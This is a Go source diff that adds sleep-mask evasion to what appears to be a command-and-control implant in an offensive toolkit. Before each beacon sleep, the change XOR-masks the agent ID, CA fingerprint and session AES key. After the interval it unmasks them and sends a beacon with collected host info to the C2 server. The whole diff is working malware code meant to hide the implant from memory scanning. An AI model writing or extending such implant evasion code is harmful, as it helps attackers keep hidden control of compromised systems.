@@ -27,6 +27,7 @@ import (
 	"sync"
 
 	"github.com/sk666G/red-sky---arsenal/internal/c2profile"
+	"github.com/sk666G/red-sky---arsenal/internal/sleepmask"
 	"time"
 
 	"github.com/sk666G/red-sky---arsenal/internal/adgo"
@@ -172,6 +173,10 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int, prof
 		return fmt.Errorf("new session: %w", err)
 	}
 
+	masker := &sleepmask.Masker{}
+	agentIDBytes := []byte(agentID)
+	caFPBytes := []byte(caFP)
+
 	// --- initial beacon ---
 	send := func(t proto.MessageType, payload any) error {
 		sendMu.Lock()
@@ -201,12 +206,31 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int, prof
 			select {
 			case <-stopBeacon:
 				return
+			default:
+			}
+			// Mask state before the sleep window. AES key + strings
+			// XOR'd with a fresh random key, restored after.
+			xorKey, merr := masker.Mask(agentIDBytes, caFPBytes)
+			if merr != nil {
+				log.Printf("mask: %v", merr)
+			}
+			if err := sess.MaskKey(xorKey); err != nil {
+				log.Printf("mask key: %v", err)
+			}
+			select {
+			case <-stopBeacon:
 			case <-time.After(sleepFn()):
 				_ = send(proto.TypeBeacon, proto.Beacon{
 					AgentID: agentID,
 					Info:    collectInfo(),
 					TS:      time.Now().Unix(),
 				})
+			}
+			if err := sess.UnmaskKey(); err != nil {
+				log.Printf("unmask key: %v", err)
+			}
+			if err := masker.Unmask(xorKey, agentIDBytes, caFPBytes); err != nil {
+				log.Printf("unmask: %v", err)
 			}
 		}
 	}()
